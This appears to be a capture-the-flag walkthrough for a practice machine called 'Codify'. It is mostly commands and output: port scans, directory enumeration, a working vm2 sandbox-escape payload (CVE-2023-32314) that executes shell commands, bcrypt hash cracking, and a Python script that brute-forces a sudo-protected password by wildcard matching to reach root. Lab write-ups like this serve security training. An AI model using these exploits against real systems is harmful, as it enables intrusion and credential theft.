`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <ip-victima> -oG allPorts`

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-07 22:22 -03
Initiating SYN Stealth Scan at 22:22
Scanning 10.10.11.239 [65535 ports]
Discovered open port 80/tcp on 10.10.11.239
Discovered open port 22/tcp on 10.10.11.239
Discovered open port 3000/tcp on 10.10.11.239
Completed SYN Stealth Scan at 22:23, 15.40s elapsed (65535 total ports)
Nmap scan report for 10.10.11.239
Host is up, received user-set (0.16s latency).
Scanned at 2023-12-07 22:22:52 -03 for 15s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.68 seconds
           Raw packets sent: 75476 (3.321MB) | Rcvd: 74514 (2.981MB)
```

<br>

```bash
nvim /etc/hosts
<ip-victima>  codify.htb
```

<br>

[http://codify.htb/](http://codify.htb/)

<br>

`nmap -p 22,80,3000 -vvv -n -Pn -sCV 10.10.11.239 -oN targeted`

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-title: Codify
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<br>

`gobuster dir -u http://codify.htb -w /usr/share/dirb/wordlists/common.txt -t 20`
```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://codify.htb
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/12/07 22:50:47 Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 2921]
/About                (Status: 200) [Size: 2921]
/editor               (Status: 200) [Size: 3123]
/server-status        (Status: 403) [Size: 275] 
                                                
===============================================================
2023/12/07 22:51:26 Finished
===============================================================
```

<br>

[CVE-2023-32314](https://nvd.nist.gov/vuln/detail/CVE-2023-32314)

<br>

`cat /var/www/contact/tickets.db`
```javascript
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("cat /var/www/contact/tickets.db").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code));
```

<br>

`joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`
```bash
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (?)
1g 0:00:00:26 DONE (2023-12-08 00:32) 0.03843g/s 51.88p/s 51.88c/s 51.88C/s winston..eunice
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

<br>

```bash
ssh joshua@10.10.11.239
spongebob1
```

<br>

```bash
script /dev/null -c bash
ctrl + z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
```

<br>

```bash
cat user.txt
30b05689ad7d88dbd41638d1945976f1
```

<br>

```python
#!/usr/bin/env python3

import string
import subprocess
import os

characters = string.ascii_letters + string.digits
password = ""
password_found = False

while not password_found:
	for character in characters:
		command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
		output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

		if "Password confirmed!" in output:
			password += character
			os.system("clear")
			print(f"Contraseña: {password}")
			break
	else:
		password_found = True
		os.system("clear")
		print(f"\n[+] La contraseña encontrada es: '{password}'")
```

`kljh12k3jhaskjh12kjh3`

<br>

```bash
su root
kljh12k3jhaskjh12kjh3
cd
cat root.txt
94a6c3a4890801e1335907899cd99559
```

